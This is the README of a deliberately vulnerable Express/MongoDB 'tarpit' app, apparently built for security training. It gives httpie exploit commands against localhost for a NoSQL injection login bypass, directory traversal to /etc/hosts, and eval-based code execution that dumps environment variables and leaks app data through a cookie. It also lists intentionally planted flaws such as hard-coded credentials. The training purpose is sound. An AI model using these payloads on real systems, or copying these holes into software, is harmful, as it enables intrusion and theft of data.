# NodeJS Tarpit - Chuck B. (edited)

An ExpressJS (tarpit) application using mongoDB.

I am using [httpie](https://httpie.org), an alternative to curl to trigger exploits.

## Getting started

:crossed_fingers::crossed_fingers::crossed_fingers: I hope all goes as smooth as possible

### Pre-requisites (Running without docker)

- [NodeJS](https://nodejs.org/en/) Get the latest version
- [MongoDB Community Edition](https://docs.mongodb.com/manual/administration/install-community/) Install Mongodb Community Edition and run setup provided in documentation

### Pre-requisites (Running with docker)

- Docker
- Run the command `make start`

### Setup (if not using docker)

start mongoDB server (`sudo mongod`)
start mongoDB client (`mongo`)
Insert user rows using the query

```bash
node db-init.js
```

### Installation (if not using docker)

Run `npm install` to install all dependencies for the project to run

### Run Application (if not using docker)

Run `npm run server` to start the application and you will provided a local address to open in browser

## Exploits

### No SQL Injection

Login can be exploited with the following query as the username and password are not validated

```bash
http  --print=HB POST http://localhost:8089/api/v1/login username:='{"$gt": ""}' password:='{"$gt": ""}'
```

### Directory Traversal Vulnerability

Can get access to any file on the server using the command

```bash
http GET http://localhost:8089/api/v1/image-lookup image=="/etc/hosts"
```

### Remote Code Execution

RCE exploting `eval` on server

```bash
http GET http://localhost:8089/user-input userInput=="console.log(process.env)"
```

Injecting script onto user browser

```bash
http GET http://localhost:8089/user-input userInput=="alert('You system is under our control now.')"
```

Can exploit the whole server by injecting something like the code below (https://medium.com/lift-security/in-memory-backdoor-for-node-js-express-apps-2a3f4301925b)

```bash
http GET http://localhost:8089/user-input userInput=="res.cookie('appLocals',JSON.stringify(req.app.locals))"
```

## Vulnerabilities

- [x] [directory traversal](src/Controllers/ImageLookup.js#L9)
- [x] [nosql injection](src/Controllers/Login.js#L33...L36)
- [x] [remote code execution](src/views.js#L19): [UserInput](src/Views/UserInput.pug#L6)
- [x] [sensitive data leak](src/Controllers/Login.js#L47)
- [x] [insider attack](src/server.js#L22...L31)
- [x] [business logic flaw](src/Controllers/Order.js#L69...L79)
- [x] [business logic flaw](src/Controllers/Order.js#L100...L110)
- [x] [hard coded credentials](src/Controllers/Order.js#L55...L63)
